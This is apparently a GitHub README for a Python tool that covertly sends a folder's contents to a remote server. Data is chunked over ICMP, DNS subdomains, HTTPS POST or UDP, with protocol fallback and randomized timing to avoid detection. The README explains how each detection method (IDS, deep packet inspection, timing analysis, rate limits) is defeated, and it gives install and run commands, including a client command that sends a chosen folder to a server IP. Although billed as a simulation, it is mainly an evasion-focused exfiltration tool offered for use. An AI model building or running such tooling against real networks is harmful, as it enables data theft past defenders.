# **Exfiltration – Adaptive Covert Data Exfiltration**

This project simulates an **adversary exfiltrating data** past network monitoring by dynamically switching **communication protocols**. The system ensures **stealthy, reliable transmission** using various **protocol camouflage techniques**, **adaptive switching**, and **traffic manipulation strategies** to evade detection.

---

## **Design Rationale & Approach**

### **Why This Approach?**

- **Avoids Detection:** Large packet transmissions are **split into small chunks**, making it harder for network monitors to flag unusual traffic.
- **Protocol Flexibility:** Multiple transmission methods allow data exfiltration across networks **with different security policies**.
- **Automatic Adaptation:** If one protocol is blocked, **fallback mechanisms** ensure data is still exfiltrated via an alternative route.
- **Encryption & Integrity:** The entire payload is **AES-encrypted**, ensuring confidentiality even if the data is intercepted.

### **How It Works**

1. **Compression & Encryption** → The folder is first compressed into an archive, then AES-encrypted.
2. **Chunking & Encoding** → The encrypted file is **split into smaller Base64-encoded chunks** to avoid detection.
3. **Protocol Selection** → Chunks are sent via **ICMP, HTTPS, DNS, or UDP**, with **fallback switching** if a protocol is blocked.
4. **Exponential Jitter Delays** → Transmission is **randomized** to mimic normal network traffic patterns.
5. **Reassembly on Server** → The server listens across all four protocols and **reconstructs the original encrypted file**.
6. **Decryption & Extraction** → Once reassembled, the file is decrypted and extracted.

---

## **Protocol Specification**

### **UDP Tunneling**

- **Fast, Stateless Transmission** → UDP does not require a handshake, allowing efficient data transfer.
- **Custom Chunk Headers** → Each chunk includes `session_id`, `chunk_id`, and `total_chunks` for tracking.
- **Retransmission Support** → Since UDP does not guarantee delivery, `MAX_TRIES` ensures retries or fallback to another protocol.

### **HTTPS Exfiltration**

- **Mimics Legitimate Web Traffic** → Data is embedded inside HTTPS POST requests, making detection difficult.
- **Encrypted Payloads** → AES-encrypted chunks ensure the data remains secure even if intercepted.
- **Failsafe Mechanism** → If `MAX_TRIES` is exceeded, an alternative protocol is used.

### **DNS-Based Data Transfer**

- **Abuses Commonly Open Protocols** → DNS is often allowed on networks even when other traffic is restricted.
- **Payloads Sent as Subdomains** → Data is encoded in DNS query subdomains (`session_id.chunk_id.chunk_data.target_domain`).
- **ACK Mechanism for Reliability** → Server responds to confirm chunk reception.

### **ICMP Tunneling**

- **Uses Ping Packets for Exfiltration** → ICMP echo requests (`ping`) are used to transmit data.
- **Avoids Firewalls Filtering TCP/UDP** → ICMP is often ignored by firewalls, making it a useful covert channel.
- **Hex Encoding Due to ICMP Limitations** → Unlike other protocols, ICMP payloads must be sent in hexadecimal format.

---

## **Techniques for Making Traffic Appear Legitimate**

To minimize detection risks, multiple techniques have been incorporated:

### **Small, Randomized Chunk Sizes**

- Large data transfers trigger suspicion, so **data is split into smaller chunks**.
- Chunks **vary in size** to mimic **natural traffic patterns**.

### **Exponential Jitter-Based Delays**

- Each chunk transmission is **delayed using exponential backoff jitter** to **avoid fixed timing patterns**.
- **Short delays are common, long delays occur randomly**, simulating **realistic user activity**.

### **Protocol Mimicry**

- **DNS traffic appears as legitimate DNS queries**, since subdomain lengths follow normal DNS constraints.
- **HTTPS traffic is embedded in POST requests**, blending in with common API interactions and uses **definable User Agent**.

### **Adaptive Switching to Evade Detection**

- If one protocol is blocked, the **system dynamically switches** to another method.
- The **fallback mechanism** ensures exfiltration **continues despite security countermeasures**.

---

## **Potential Detection Methods & Countermeasures**

Even though this system is designed for stealth, **defensive security teams** may still attempt to detect or mitigate exfiltration. Here’s how:

### **Anomaly Detection in Packet Sizes**

- **How it's detected:** IDS/IPS systems flag **unusual ICMP payload sizes**, **large DNS queries**, or **unexpected HTTPS requests**.
- **Countermeasure:** **Chunk sizes are randomized**, and **padding techniques** can be used to make traffic appear more natural.

### **Deep Packet Inspection (DPI)**

- **How it's detected:** DPI can inspect **DNS queries**, **HTTP requests**, or **ICMP payloads** for anomalies.
- **Countermeasure:** Using **AES encryption**, payloads appear **randomized and meaningless** to DPI systems.

### **Traffic Timing & Behavioral Analysis**

- **How it's detected:** Anomalies in packet timing can be identified if data is sent at a **predictable interval**.
- **Countermeasure:** **Exponential jitter delays** prevent predictable patterns, making traffic **blend in with legitimate background noise**.

### **Rate Limiting & Firewall Policies**

- **How it's detected:** Organizations may enforce **rate limits on DNS queries, ICMP requests, or UDP packets**.
- **Countermeasure:** The system **automatically retries chunks** while **adapting protocol selection** to avoid getting blocked.

---

## **Installation**

Make sure Python 3 is installed.

```bash
git clone https://github.com/truncet/py-exfil.git
cd py-exfil
pip install -r requirements.txt
```

---

## **Usage**

### **Start the Server**

The server should be run as root.

Before running the server, generate SSL certificates:
```bash
cd server
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
python3 server.py
```

### **Run the Client**

```bash
cd client
python3 client.py --target-ip <SERVER_IP> --folder <FOLDER_PATH> --target-domain <DOMAIN>
```
- `--target-ip` → Server IP address
- `--folder` → Path of the folder to exfiltrate
- `--target-domain` → Domain for DNS-based exfiltration

---

## **Future Enhancements**

**Traffic Shaping to Resemble Normal Traffic**  
**Dynamic Encryption Key Exchange (RSA instead of Pre-Shared Keys)**  
**Support for Additional Covert Channels (e.g., SMTP, VoIP)**  
**Metadata Encryption to Further Obfuscate Chunk Tracking**  

---
